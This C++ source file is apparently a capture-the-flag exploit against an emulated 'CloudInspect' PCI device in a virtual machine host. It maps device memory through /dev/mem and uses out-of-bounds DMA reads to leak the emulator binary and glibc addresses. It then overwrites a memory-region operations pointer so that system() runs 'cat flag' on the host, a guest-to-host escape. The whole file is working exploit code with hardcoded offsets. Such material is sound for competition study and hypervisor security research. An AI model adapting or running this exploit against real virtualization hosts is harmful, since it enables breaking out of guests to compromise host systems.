#include <iostream>
#include <sys/mman.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
using namespace std;

/*
/ # cat /proc/iomem

  feb00000-febfffff : 0000:00:02.0

*/

#define DMA_SIZE        4096
#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98

#define DEVICE_START_ADDR   0xfeb00000
#define MAP_SIZE            0xfffff

#define CLOUDINSPECT_DMA_GET_VALUE      0x1
#define CLOUDINSPECT_DMA_PUT_VALUE      0x2

#define MEMORYREGIONSIZE    0xf0
#define PCIDEVICESIZE       0x8f0

void *map_device(int fd)
{
    void *mem;
    mem = mmap(NULL, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, DEVICE_START_ADDR);
    assert(mem != 0);
    return mem;
}

void unmap_device(void *mem)
{
    munmap(mem, MAP_SIZE);
}

uint64_t read_magic(void *mem)
{
    return ((uint64_t *)mem)[0];
}

void set_src(void* mem, uint64_t src)
{
    *(uint64_t *)((uintptr_t)mem + CLOUDINSPECT_MMIO_OFFSET_SRC) = src;
}

void set_dst(void* mem, uint64_t dst)
{
    *(uint64_t *)((uintptr_t)mem + CLOUDINSPECT_MMIO_OFFSET_DST) = dst;
}

void set_cmd(void* mem, uint64_t cmd)
{
    *(uint64_t *)((uintptr_t)mem + CLOUDINSPECT_MMIO_OFFSET_CMD) = cmd;
}

void set_cnt(void* mem, uint64_t cnt)
{
    *(uint64_t *)((uintptr_t)mem + CLOUDINSPECT_MMIO_OFFSET_CNT) = cnt;
}

uint64_t read_val(void* mem)
{
    uint64_t val;

    set_cmd(mem, CLOUDINSPECT_DMA_GET_VALUE);
    val = *(uint64_t*)((uintptr_t)mem + CLOUDINSPECT_MMIO_OFFSET_TRIGGER);
    return val;
}

void write_val(void *mem) {
    set_cmd(mem, CLOUDINSPECT_DMA_PUT_VALUE);
    *(uint64_t*)((uintptr_t)mem + CLOUDINSPECT_MMIO_OFFSET_TRIGGER) = 'M';
}


uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        printf("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        printf("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

uint64_t read_from_dma_buff(void* mem, uint64_t physicaldst, uint64_t offset, uint64_t count) {
    uint64_t val;

    set_dst(mem, physicaldst);
    set_src(mem, offset);
    set_cnt(mem, count);
    val = read_val(mem);
    return val;
}

void write_to_dma_buff(void *mem, uint64_t physicalsrc, uint64_t offset, uint64_t count) {
    set_dst(mem, offset);
    set_src(mem, physicalsrc);
    set_cnt(mem, count);
    write_val(mem);
}

void show_oob_leaks(void *mem, void *buf, uint64_t physicalbuff)
{
    for(int i = 0; i< 0x100; i++)
    {
        uint64_t val = read_from_dma_buff(mem, physicalbuff, DMA_SIZE+i*8, sizeof(uint64_t));
        cout << i << " " << hex << *(uint64_t *)buf << endl;
    }
}

typedef struct OPS
{
    void *fun[0x10];

} OPS;

typedef struct __attribute__((packed)) MemoryRegion
{
    void *ops;
    void *opaque;
} MemoryRegion;

int main(int argc, char const *argv[])
{
    void *mem;
    uint64_t magic;
    void *buf;
    uint64_t physicalbuff;

    cout << "Exploit started!" << endl;
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    assert(fd > 0);

    mem = map_device(fd);
    magic = read_magic(mem);

    cout << "The magic is " << hex << magic << endl;

    // We will try to see which values we have when going oob
    // And we will try to have a leak.
    buf = (void*)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED)
    {
        cout << "mmap error: " << strerror(errno) << endl;
    }
    mlock(buf, 0x1000);
    cout << "buf : " << hex << buf << endl;
    physicalbuff = virt2phys(buf);
    cout << "Physical buff address : " << hex << physicalbuff << endl;

    // We will just show some random value beyond the CloudInspectState->dma_buff[0x4000]
    // show_oob_leaks(mem, buf, physicalbuff);

    read_from_dma_buff(mem, physicalbuff, DMA_SIZE + (8*6), 8);
    uint64_t binary_leak = *(uint64_t*)buf;
    cout << "Binary leak @ " << hex << binary_leak << endl;
    uint64_t binary_base = binary_leak - 0x62f510;
    uint64_t mmio_ops = binary_leak + 0x663a10;
    cout << "Binary base @ " << hex << binary_base << endl;

    read_from_dma_buff(mem, physicalbuff, -((5 * 8) + (MEMORYREGIONSIZE - 0x50)), sizeof(uint64_t));
    uint64_t cloudinspectstate = *(uint64_t*)buf;
    cout << "CloudInpectState @ " << hex << cloudinspectstate << endl;

    uint64_t dma_buff = cloudinspectstate + PCIDEVICESIZE + MEMORYREGIONSIZE + 5*8;
    cout << "DMA buff starting at @ " << hex << dma_buff << endl;

    uint64_t memset_got = binary_base + 0xd7fe68;
    cout << "Trying to leak the content of this pointer @ " << hex << memset_got << endl;

    uint64_t offsetgotbuff = dma_buff - memset_got;
    read_from_dma_buff(mem, physicalbuff, -(offsetgotbuff), sizeof(uint64_t));
    uint64_t memset_glibc = *(uint64_t*)buf;
    cout << "Glibc memset @ " << hex << memset_glibc << endl;

    uint64_t glibc_base = memset_glibc - 0x18eaf0;
    cout << "Glibc base @ " << hex << glibc_base << endl;

    // Trying to crash it for test (point ops somewhere where it will crash.)
    OPS ops;
    MemoryRegion mmio;

    uint64_t system_glibc = glibc_base + 0x55410;

    for(int i = 0; i < sizeof(ops.fun)/8; i++)
        ops.fun[i] = (void*)system_glibc;

    mmio.ops = (void*)dma_buff;
    mmio.opaque = (void*)(dma_buff + 0x1000);
    memcpy(buf, &ops, sizeof(OPS));
    memcpy((char *)buf + sizeof(OPS), "cat flag", 9);

    write_to_dma_buff(mem, physicalbuff, 0, sizeof(OPS) + sizeof(MemoryRegion));

    *(uint64_t*)buf = dma_buff;
    *((uint64_t*)buf + 1) = dma_buff + sizeof(OPS);
    write_to_dma_buff(mem, physicalbuff, -(5*8) - MEMORYREGIONSIZE + 0x48, sizeof(uint64_t)*2);
    // getchar as pause
    getchar();

    read_from_dma_buff(mem, physicalbuff, 0, sizeof(uint64_t));

    // Destructor.
    unmap_device(mem);
    munmap(buf, 0x1000);
    close(fd);
    return 0;
}
